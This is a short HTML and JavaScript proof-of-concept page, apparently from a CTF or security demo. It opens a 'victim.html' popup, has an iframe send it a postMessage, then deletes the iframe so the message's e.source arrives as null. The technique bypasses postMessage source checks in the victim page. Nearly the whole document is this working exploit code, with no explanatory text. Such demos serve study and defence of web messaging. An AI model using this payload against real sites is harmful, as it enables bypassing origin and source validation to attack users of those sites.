<!DOCTYPE html>
<!-- <a href=javascript:solve()>CLICK ME<br> -->
<!-- <button onclick=solve()>CLICK ME</button> -->
<a href="#" onclick="solve(); return false;">CLICK ME</a>
  <!-- change this to a button -->
  <span id=ifr>
    <iframe></iframe>
  </span>

<script>
function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}
  
async function solve() {
  let win = window.win = window.open('https://daemoon.me/demo/victim.html', '_blank', 'width=500,height=500');
  
  await sleep(2000);
  
  // Send postMessage from the iframe
  frames[0].eval("parent.win.postMessage(0xdeadbeef,'*')");
  
  // Delete the old iframe
  // now e.source is null
  ifr.innerHTML = 'aaabcd';
}
     
</script>